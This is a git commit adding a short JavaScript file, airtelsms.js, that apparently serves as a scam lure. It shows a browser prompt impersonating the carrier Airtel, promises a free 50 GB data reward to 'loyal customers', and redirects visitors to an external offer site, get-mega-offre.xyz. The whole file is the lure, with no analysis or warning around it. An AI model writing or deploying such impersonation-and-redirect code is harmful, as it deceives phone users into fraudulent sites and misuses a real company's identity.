32b942c36cceb6fc07e374e97c337f2913e68c7e
bigetijazz9 <bigetijazz9@gmail.com>
2024-11-10 20:56:47 -0800

    Create airtelsms.js

---
+++ airtelsms.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('Airtel : Cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir des données ACTIVER 50 Go, récompense des anciens clients, appuyez sur Ok pour vérifier maintenant','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://www.get-mega-offre.xyz/airtel50go';
+}
